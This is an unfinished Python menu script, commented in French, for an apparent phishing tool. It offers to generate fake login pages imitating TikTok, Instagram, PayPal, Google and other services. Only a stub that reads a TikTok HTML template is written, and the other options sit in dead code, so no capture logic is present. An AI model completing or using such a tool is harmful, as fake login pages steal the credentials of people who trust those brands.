from colorama import init, Fore, Style


init(autoreset=True)

def afficher_menu_phishing(langue_actuelle):
    # Affichage du menu de phishing


    print(f"""{Fore.CYAN}{Style.BRIGHT}
══════════════════════════════════════════════════════════════════════
          ASCII ART PHISHING TOOL HERE
══════════════════════════════════════════════════════════════════════
{Fore.MAGENTA}  🌐 Générateur de fausse page HTML

{Fore.YELLOW}              [1] TikTok
              [2] Instagram
              [3] Facebook   
              [4] Google
              [5] Netflix
              [6] PayPal
              [7] Amazon
              [8] Twitter
              [9] LinkedIn
              [10] Snapchat
              [12] Retour au menu principal

        
""")
    
    choix_local = int(input(Fore.CYAN + ("Enter choice: " if langue_actuelle == "EN" else "Entrez votre choix : ")))
    
    
    def tiktok():
        with open("page/Tiktok.html", "r") as template_file:
            template_content = template_file.read()

    if choix_local == 1:
        try:
            tiktok()
        except Exception as e:
            print(Fore.RED + f"❌ Error: {e}" if langue_actuelle == "EN" else f"❌ Erreur : {e}")
            input(Fore.GREEN + ("Press Enter to continue..." if langue_actuelle == "EN" else "Appuyez sur Entrée pour continuer..."))
    

    


        """       elif choix == 2:
            generer_page("Instagram")
        elif choix == 3:
            generer_page("Facebook")
        elif choix == 4:    
            generer_page("Google")
        elif choix == 5:       
            generer_page("Netflix")
        elif choix == 6:
            generer_page("PayPal")
        elif choix == 7:
            generer_page("Amazon")
        elif choix == 8:
            generer_page("Twitter")
        elif choix == 9:
            generer_page("LinkedIn")
        elif choix == 10:
            generer_page("Snapchat")
        elif choix == 12:
            return  # Retour au menu principal
        else:
            print(f"{Fore.RED}Choix invalide. Veuillez réessayer.")
            if langue_actuelle == "FR":
                input("Appuyez sur Entrée pour continuer...")   
                afficher_menuFR()
            else:
                input("Press Enter to continue...")   
                afficher_menuEN()
            return  
    """